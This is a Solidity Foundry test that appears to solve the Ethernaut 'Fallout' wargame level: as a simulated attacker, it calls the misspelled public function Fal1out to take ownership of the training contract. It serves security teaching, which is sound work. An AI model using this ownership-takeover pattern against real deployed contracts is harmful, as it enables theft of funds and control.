// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../../src/ethernaut-002-fallout/Fallout.sol";

contract FalloutTest is Test {
    Fallout public fallout_contract;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
        fallout_contract = new Fallout();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        fallout_contract.Fal1out{value: 1 ether}();
        assertEq(fallout_contract.owner(), attacker, "Owner not changed");

        vm.stopPrank();
    }
}
